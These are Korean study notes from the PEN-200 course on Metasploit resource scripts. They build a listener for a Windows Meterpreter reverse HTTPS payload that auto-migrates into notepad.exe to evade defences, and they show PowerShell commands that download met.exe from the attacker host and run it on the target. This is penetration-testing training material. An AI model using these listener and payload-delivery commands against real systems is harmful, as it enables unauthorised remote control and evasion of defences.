# 21.4.1 Resource 스크립트

> **Resource Scripts** · PEN-200 §21.4.1

resource 스크립트는 msfconsole 명령과 Ruby 코드를 이어 붙인 것임. Metasploit 자체가 Ruby 로 만들어졌으므로 제어 흐름이나 고급 로직도 Ruby 로 넣을 수 있음.

전형적인 용례는 리스너임 — 리버스 셸을 받을 때마다 `multi/handler` 를 손으로 세팅하는 반복을 없앰. 예시는 non-staged Windows 64비트 Meterpreter 페이로드용 리스너를 `~/listener.rc` 로 만드는 것임. 명령 순서를 먼저 정한 뒤 그대로 적으면 됨 — 모듈 활성화, 페이로드 지정, `LHOST`·`LPORT` 설정.

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
```

**`AutoRunScript` — 세션이 열리는 즉시 모듈을 하나 자동 실행함.** `post/windows/manage/migrate` 를 걸어두면 Meterpreter 가 알아서 `notepad.exe` 를 백그라운드로 띄우고 그리로 이주함. 이주를 자동화하는 이유는 방어 기제나 원 프로세스 종료로 페이로드가 일찍 죽는 상황을 피하기 위함임.

```
set AutoRunScript post/windows/manage/migrate
```

**`ExitOnSession` 을 false 로 둠.** 세션이 하나 생겨도 리스너가 죽지 않고 계속 새 연결을 받음.

```
set ExitOnSession false
```

`ExitOnSession`(multi/handler 쪽)·`AutoRunScript`(페이로드 쪽) 같은 고급 옵션은 모듈이나 페이로드를 활성화한 상태에서 `show advanced` 로 찾음.

끝으로 실행 명령을 적음. `-j` 는 백그라운드 job 으로 돌리는 것이고 `-z` 는 생성된 세션으로 자동 진입하지 않게 하는 것임.

```
run -z -j
```

저장한 스크립트는 msfconsole 의 `-r` 인자로 넘김.

이후 타겟에서 `met.exe` 를 실행하면 세션이 열리면서 `AutoRunScript` 가 걸려 새로 띄운 Notepad 프로세스로 자동 이주함.

```
PS C:\Users\justin> iwr -uri http://192.168.119.4/met.exe -Outfile met.exe
PS C:\Users\justin> .\met.exe
```

**Metasploit 이 기본 제공하는 resource 스크립트도 있음** — `scripts/resource/` 디렉터리임. 포트 스캔·브루트포스·프로토콜 열거용 스크립트가 들어 있음.

⚠️ 제공 스크립트는 그대로 돌리지 말고 **내용을 읽어 이해하고 상황에 맞게 고친 뒤** 쓸 것.

일부 제공 스크립트는 `RHOSTS` 같은 옵션을 Metasploit 의 «전역 datastore» 에서 가져다 씀. `set`·`unset` 이 지금 활성화된 모듈 컨텍스트에만 적용되는 반면, `setg`·`unsetg` 는 모든 모듈에 걸치는 전역 값을 만듦.

리스너·피벗·포스트 익스플로잇 같은 반복 작업의 resource 스크립트를 미리 만들어 두고 침투 테스트마다 조금씩 고쳐 쓰면 시간을 크게 아낌.
